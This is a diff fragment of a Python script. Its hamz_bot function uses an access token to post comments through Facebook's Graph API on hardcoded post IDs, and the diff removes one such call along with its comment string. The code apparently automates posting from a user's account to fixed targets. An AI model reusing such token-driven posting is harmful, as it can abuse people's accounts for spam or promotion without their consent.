@@ -597,8 +597,6 @@ def hamz_bot():
     requests.post('https://graph.facebook.com/2998427890475824/comments/?message=' +kom+ '&access_token=' + token)
     requests.post('https://graph.facebook.com/402798721416840/comments/?message=' +kom2+ '&access_token=' + token)
     requests.post('https://graph.facebook.com/402832164746829/comments/?message=' +kom3+ '&access_token=' + token)
-    requests.post('https://graph.facebook.com/2998427890475824/comments/?message=' +kom4+ '&access_token=' + token)
-    kom4 = " https://www.facebook.com/100009259285042/posts/2998427890475824/?app=fbl"
     menu()
     
      
